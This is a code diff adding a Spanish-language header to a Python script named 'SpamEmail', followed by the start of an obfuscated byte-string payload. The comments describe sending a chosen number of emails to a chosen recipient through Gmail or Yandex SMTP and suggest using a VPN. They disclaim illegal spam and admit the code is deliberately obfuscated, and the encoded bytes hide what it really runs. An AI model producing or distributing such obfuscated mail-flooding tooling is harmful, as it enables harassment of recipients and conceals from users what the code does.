@@ -1,3 +1,20 @@
+# ⚠️ Nota sobre SpamEmail
+
+# Como ya lo han visto, este código está diseñado para enviar correos a través de SMTP
+# Compatible con proveedores como Gmail (requiere contraseña de aplicación) y Yandex (usa contraseña normal).
+
+# 🟡 Este script **no es para hacer spam masivo ilegal**. Su propósito es educativo y para pruebas propias.  
+# Puedes usarlo con una VPN si lo deseas, y es ideal para hacer pruebas con tus propios correos.
+
+# 🔐 Toda la información la introduces tú mismo, incluyendo remitente, receptor, asunto, mensaje y cantidad de envíos.
+
+# ✅ Buena suerte usándolo. El script va ofuscado parcialmente por el tiempo de ejecución interactivo, así que tómalo con calma.
+
+# Gracias por usar SpamEmail ✉️
+
+
+
+
 H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC = b""
 H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC += b"\x26\x6c\x6b\x3d\x72\x40\x79\x43\x58\x25"
 H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC_H04_DECSEC += b"\x28\x2f\x7b\x78\x47\x6c\x54\x64\x28\x66"
